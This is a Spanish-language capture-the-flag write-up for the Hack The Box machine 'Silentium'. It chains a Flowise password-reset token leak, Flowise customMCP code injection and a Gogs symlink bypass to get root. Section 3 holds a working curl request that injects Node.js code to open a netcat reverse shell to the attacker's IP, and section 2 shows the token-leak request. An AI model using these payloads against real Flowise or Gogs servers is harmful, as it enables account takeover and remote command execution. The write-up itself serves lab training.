# HTB - Silentium Writeup

---

## 1. Reconocimiento e Infección Inicial

### Escaneo de Red
El análisis inicial con **nmap** reveló dos puertos abiertos:
* **22/tcp**: SSH
* **80/tcp**: HTTP (Nginx)

Al visitar la dirección IP directamente, el servidor no mostraba contenido relevante. Se procedió a agregar el dominio principal al archivo `/etc/hosts`:
```bash
echo "10.129.42.178 silentium.htb" | sudo tee -a /etc/hosts
```

### Descubrimiento de Virtual Hosts (Fuzzing)
Dado que la página principal era un sitio estático sin información, se realizó un fuzzing de subdominios utilizando **ffuf**.

**Comando utilizado:**
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.42.178 -H "Host: FUZZ.silentium.htb" -ac
```

**Resultado:**
Se identificó el subdominio `staging.silentium.htb` (Size: 3142). Este se agregó inmediatamente al archivo de hosts para permitir la resolución del nombre en el navegador y herramientas de consola.

---

## 2. Foothold — Flowise (CVE-2025-58434)

Al acceder a `staging.silentium.htb`, se identificó una instancia de **Flowise 3.0.5**. A través de la enumeración de la API, se detectó una vulnerabilidad de exposición de información en el endpoint de recuperación de contraseña.

### Explotación del Token Leak
Al solicitar un restablecimiento de contraseña para el usuario `ben@silentium.htb`, el servidor devolvió el token temporal en el cuerpo de la respuesta JSON, permitiendo el secuestro de la cuenta.

**Petición:**
```bash
curl -s http://staging.silentium.htb/api/v1/account/forgot-password \
  -X POST -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq
```

**Respuesta vulnerable:**
Se obtuvo el campo `"tempToken": "Aet1JNlLmgv7cBbSubVuT..."`. Con este token se procedió a cambiar la contraseña del usuario `admin` (asociado al correo de Ben) mediante una petición `POST` al endpoint `/api/v1/account/reset-password`.

---

## 3. Intrusión y RCE (CVE-2025-59528)

Una vez obtenida la sesión como administrador, se utilizó la funcionalidad `customMCP` para lograr la ejecución remota de comandos (RCE).

**Payload de Reverse Shell:**
Se utilizó un comando de Node.js inyectado en la configuración del servidor para forzar una conexión de vuelta hacia la máquina atacante.

```bash
curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -X POST \
  -H "Authorization: Bearer <API_KEY>" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(()=>{process.mainModule.require(\"child_process\").exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.203 443 >/tmp/f\");return 1;})()})"}}'
```

---

## 4. Escalada de Privilegios — Gogs (CVE-2025-8110)

Dentro del contenedor Docker, se encontraron credenciales en las variables de entorno (`FLOWISE_PASSWORD=F1l3_d0ck3r`). Estas permitieron el acceso por SSH al host como el usuario **ben**.

### Túnel SSH y Servicio Interno
Se detectó el servicio **Gogs** (Git Service) corriendo internamente en el puerto **3001**. Para interactuar con él, se estableció un túnel local:
```bash
ssh -L 8080:127.0.0.1:3001 ben@10.129.42.178
```

### Symlink Bypass
Gogs era vulnerable a un bypass de enlaces simbólicos (symlinks) a través de su API. Al crear un repositorio y subir un symlink apuntando a archivos sensibles del sistema (como `.git/config` o archivos en `/etc/cron.d/`), fue posible sobreescribir configuraciones del servidor que se ejecutan como **root**.

---

## 5. Análisis de Errores y Soluciones

Durante el proceso de explotación, surgieron varios obstáculos técnicos que requirieron ajustes en la estrategia:

| Error Encontrado | Causa Técnica | Solución Aplicada |
| :--- | :--- | :--- |
| **ffuf sin resultados** | El servidor devolvía el mismo tamaño de respuesta para subdominios inexistentes, ocultando los reales. | Se utilizó el flag `-ac` (Auto-Calibration) para filtrar automáticamente las respuestas por defecto. |
| **RCE fallido (No actions)** | El script original contenía el marcador `<TU_IP_VPN>` literal en lugar de una IP válida. | Se identificó la IP de la interfaz `tun0` (10.10.14.203) y se actualizó el payload del `curl`. |
| **Gogs API 404 Error** | El repositorio creado manualmente estaba vacío y no contenía la rama `master`. | Se inicializó el repositorio con un archivo `README.md` para crear la estructura de ramas necesaria. |
| **Gogs API 500 Error** | El motor de plantillas de Go fallaba al intentar renderizar la respuesta después de un Path Traversal exitoso. | Se ignoró el error visual y se verificó la ejecución del comando en el listener de netcat. |
| **Git Push 401 Unauthorized** | Git no procesaba correctamente contraseñas con caracteres especiales a través de HTTP. | Se utilizó el **Personal Access Token** directamente en la URL de clonado (`http://TOKEN@127.0.0.1:8080/...`). |

---

## 6. Flags
* **User:** ``
* **Root:** ``

---

## Herramientas Utilizadas
* Nmap
* Ffuf
* Burp Suite
* Python (Requests & Subprocess)
* Netcat (nc)
* SSH Tunneling
